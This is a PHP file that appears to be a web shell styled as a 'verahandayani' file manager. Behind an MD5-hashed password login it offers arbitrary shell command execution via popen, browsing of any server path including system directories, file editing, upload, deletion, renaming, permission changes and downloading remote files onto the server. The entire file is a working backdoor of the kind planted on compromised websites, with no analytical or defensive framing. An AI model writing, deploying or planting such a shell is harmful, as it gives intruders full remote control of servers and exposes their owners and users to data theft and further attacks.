<?php

session_start();

$PASS_HASH = "de5d406f5a9cc2aef32554cf0d523c7b";

if (!isset($_SESSION['auth'])) {

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {

        if (md5($_POST['password']) === $PASS_HASH) {

            $_SESSION['auth'] = true;

            header("Location: ?");

            exit;

        } else {

            $error = "Wrong password.";

        }

    }

    ?><!DOCTYPE html>

<html>

<head>

    <title>Login - verahandayani</title>

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>

        body {

            background: url('https://m.gettywallpapers.com/wp-content/uploads/2023/10/4k-Itachi-Uchiha-Wallpaper-For-iPhone.jpg') no-repeat center center fixed;

            background-size: cover;

            display: flex;

            align-items: center;

            justify-content: center;

            height: 100vh;

            font-family: sans-serif;

            margin: 0;

        }

        .box {

            background: rgba(255,255,255,0.1);

            backdrop-filter: blur(10px);

            padding: 30px;

            border-radius: 15px;

            color: white;

            width: 90%;

            max-width: 350px;

            text-align: center;

            box-shadow: 0 8px 32px rgba(0,0,0,0.2);

        }

        input, button {

            padding: 10px;

            border: none;

            border-radius: 8px;

            width: 100%;

            margin: 10px 0;

            font-size: 16px;

            background: rgba(255,255,255,0.2);

            color: white;

        }

        button { background: rgba(0,128,255,0.5); font-weight: bold; cursor: pointer; }

        .error { color: #f88; font-size: 14px; }

    </style>

</head>

<body>

    <form class="box" method="post">

        <h2>🔐 Login</h2>

        <input type="password" name="password" placeholder="Enter Password" required>

        <button type="submit">Access</button>

        <?php if (!empty($error)) echo "<div class='error'>$error</div>"; ?>

    </form>

</body>

</html>

<?php exit;

}

error_reporting(0); if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['current_path']) && is_dir($_POST['current_path'])) { $path = realpath($_POST['current_path']); } else { $path = realpath($_GET['path'] ?? getcwd()); if (!$path || !is_dir($path)) $path = getcwd(); }

if (isset($_GET['edit']) && is_file($_GET['edit'])) { $edit_file = $_GET['edit']; if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) { file_put_contents($edit_file, $_POST['content']); header("Location: ?path=" . urlencode(dirname($edit_file))); exit; } $content = htmlspecialchars(file_get_contents($edit_file)); echo "<form method='post'><textarea name='content' style='width:100%;height:80vh;'>$content</textarea><button type='submit'>💾 Save</button></form>"; exit; }

if ($_SERVER['REQUEST_METHOD'] === 'POST') { if (isset($_POST['new_folder'])) mkdir($path.'/'.basename($_POST['new_folder'])); if (isset($_FILES['file'])) move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name']); if (isset($_POST['remote_url'])) { $f = basename(parse_url($_POST['remote_url'], PHP_URL_PATH)); file_put_contents($path.'/'.$f, file_get_contents($_POST['remote_url'])); } if (isset($_POST['delete'])) { $t = $path.'/'.$_POST['delete']; is_file($t) ? unlink($t) : rmdir($t); } if (isset($_POST['rename_from'], $_POST['rename_to'])) rename($path.'/'.$_POST['rename_from'], $path.'/'.$_POST['rename_to']); if (isset($_POST['chmod_file'], $_POST['chmod_value'])) chmod($_POST['chmod_file'], octdec($_POST['chmod_value'])); if (isset($_POST['shell_cmd'])) { $cmd = $_POST['shell_cmd']; $handle = popen($cmd." 2>&1", "r"); $output = ''; while (!feof($handle)) $output .= fread($handle, 1024); pclose($handle); } }

$files = scandir($path); ?>

<!DOCTYPE html><html>

<head>

    <meta charset="UTF-8">

    <title>verahandayani - File Manager</title>

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>

        body {

            font-family: sans-serif;

            margin: 0;

            padding: 20px;

            background: url('https://images5.alphacoders.com/131/thumb-1920-1318498.jpeg') no-repeat center center fixed;

            background-size: cover;

            color: white;

        }

        .glass {

            background: rgba(255,255,255,0.08);

            backdrop-filter: blur(10px);

            border: 1px solid rgba(255,255,255,0.2);

            border-radius: 15px;

            padding: 20px;

            margin-bottom: 20px;

            box-shadow: 0 8px 32px rgba(0,0,0,0.2);

        }

        table {

            width: 100%;

            border-collapse: collapse;

            margin-top: 10px;

        }

        th, td {

            padding: 10px;

            border-bottom: 1px solid rgba(255,255,255,0.2);

            color: white;

        }

        a { color: white; text-decoration: none; }

        form {

            display: flex;

            flex-wrap: wrap;

            gap: 10px;

            margin-top: 10px;

        }

        input, button {

            padding: 8px;

            border: none;

            border-radius: 8px;

            background: rgba(255,255,255,0.2);

            color: white;

            flex: 1;

        }

        button {

            background: rgba(0,128,255,0.5);

            font-weight: bold;

            cursor: pointer;

        }

        .small-btn {

            padding: 4px 8px;

            background: rgba(255,50,50,0.5);

        }

        pre {

            white-space: pre-wrap;

            background: rgba(0,0,0,0.4);

            padding: 10px;

            border-radius: 10px;

            margin-top: 10px;

            color: #0f0;

        }

    </style>

</head>

<body>

    <div class="glass">

        <h2>📁 File Manager — <?= htmlspecialchars($path) ?></h2><form method="get">

        <input type="text" name="path" placeholder="🔍 Jump to path (e.g. /etc)" value="<?= htmlspecialchars($path) ?>">

        <button type="submit">Go</button>

    </form>

    <form method="post">

        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

        <input type="text" name="new_folder" placeholder="📁 New Folder" required>

        <button type="submit">Create</button>

    </form>

    <form method="post" enctype="multipart/form-data">

        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

        <input type="file" name="file" required>

        <button type="submit">Upload</button>

    </form>

    <form method="post">

        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

        <input type="text" name="remote_url" placeholder="🌐 Remote URL" required>

        <button type="submit">Fetch</button>

    </form>

    <form method="post">

        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

        <input type="text" name="shell_cmd" placeholder="💻 Shell Command">

        <button type="submit">Run</button>

    </form>

</div>

<?php if (!empty($output)): ?>

<div class="glass">

    <strong>💻 Output:</strong>

    <pre><?= htmlspecialchars($output) ?></pre>

</div>

<?php endif; ?>

<table class="glass">

    <tr><th>Name</th><th>Type</th><th>Size</th><th>🔐</th><th>Actions</th></tr>

    <?php foreach ($files as $f):

        if ($f === "." || $f === "..") continue;

        $full = $path.'/'.$f;

        $perm_ok = is_readable($full) && is_writable($full);

        $perm_color = $perm_ok ? 'style="color:#0f0;"' : 'style="color:#f44;"';

        $perm_icon = $perm_ok ? '🟢' : '🔴';

    ?>

    <tr>

        <td <?= $perm_color ?>>

            <?= is_dir($full) ? "📂" : "📄" ?>

            <a href="?path=<?= urlencode(realpath($full)) ?>"><?= htmlspecialchars($f) ?></a>

        </td>

        <td><?= is_dir($full) ? "Folder" : "File" ?></td>

        <td><?= is_file($full) ? filesize($full)." B" : "-" ?></td>

        <td <?= $perm_color ?>><?= $perm_icon ?></td>

        <td>

            <form method="post" style="display:inline;">

                <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                <input type="hidden" name="delete" value="<?= htmlspecialchars($f) ?>">

                <button class="small-btn" onclick="return confirm('Delete <?= $f ?>?')">🗑️</button>

            </form>

            <form method="post" style="display:inline;">

                <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                <input type="hidden" name="rename_from" value="<?= htmlspecialchars($f) ?>">

                <input type="text" name="rename_to" placeholder="Rename" required>

                <button class="small-btn">✏️</button>

            </form>

            <form method="post" style="display:inline;">

                <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                <input type="hidden" name="chmod_file" value="<?= htmlspecialchars($full) ?>">

                <input type="text" name="chmod_value" placeholder="755" size="3">

                <button class="small-btn">🔧</button>

            </form>

            <?php if (is_file($full)): ?>

            <a href="?edit=<?= urlencode($full) ?>">📝</a>

            <?php endif; ?>

        </td>

    </tr>

    <?php endforeach; ?>

</table>

</body>

</html>
